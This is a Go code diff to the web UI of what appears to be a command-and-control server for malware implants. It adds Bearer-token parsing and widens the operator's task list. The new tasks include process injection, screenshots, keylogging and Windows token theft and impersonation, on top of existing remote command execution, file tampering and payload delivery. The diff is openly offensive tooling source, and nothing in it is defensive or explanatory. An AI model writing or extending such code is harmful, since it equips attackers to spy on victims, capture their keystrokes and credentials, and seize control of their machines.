@@ -11,6 +11,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
@@ -68,6 +69,9 @@ func NewWebUI(s *Server) *WebUIServer {
 func (w *WebUIServer) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
 	return func(wr http.ResponseWriter, r *http.Request) {
 		token := r.Header.Get("Authorization")
+		if strings.HasPrefix(token, "Bearer ") {
+			token = token[7:]
+		}
 		if token == "" {
 			token = r.URL.Query().Get("token")
 		}
@@ -183,18 +187,26 @@ func (w *WebUIServer) handleTaskAPI(wr http.ResponseWriter, r *http.Request) {
 	}
 
 	taskTypeMap := map[string]encode.TaskType{
-		"exec":      encode.TaskExecCmd,
-		"ps":        encode.TaskExecPS,
-		"sysinfo":   encode.TaskSysInfo,
-		"privinfo":  encode.TaskPrivInfo,
-		"listdir":   encode.TaskListDir,
-		"proclist":  encode.TaskProcList,
-		"kill":      encode.TaskProcKill,
-		"filedel":   encode.TaskFileDelete,
-		"fileread":  encode.TaskFileRead,
-		"filewrite": encode.TaskFileWrite,
-		"payload":   encode.TaskPayload,
-		"exit":      encode.TaskExit,
+		"exec":        encode.TaskExecCmd,
+		"ps":          encode.TaskExecPS,
+		"sysinfo":     encode.TaskSysInfo,
+		"privinfo":    encode.TaskPrivInfo,
+		"listdir":     encode.TaskListDir,
+		"proclist":    encode.TaskProcList,
+		"kill":        encode.TaskProcKill,
+		"filedel":     encode.TaskFileDelete,
+		"fileread":    encode.TaskFileRead,
+		"filewrite":   encode.TaskFileWrite,
+		"payload":     encode.TaskPayload,
+		"inject":      encode.TaskInject,
+		"screenshot":  encode.TaskScreenshot,
+		"keylogon":    encode.TaskKeylogOn,
+		"keylogoff":   encode.TaskKeylogOff,
+		"tokens":      encode.TaskTokenEnum,
+		"steal_token": encode.TaskTokenSteal,
+		"rev2self":    encode.TaskTokenRev2,
+		"make_token":  encode.TaskTokenMake,
+		"exit":        encode.TaskExit,
 	}
 
 	taskTypeCode, ok2 := taskTypeMap[req.TaskType]
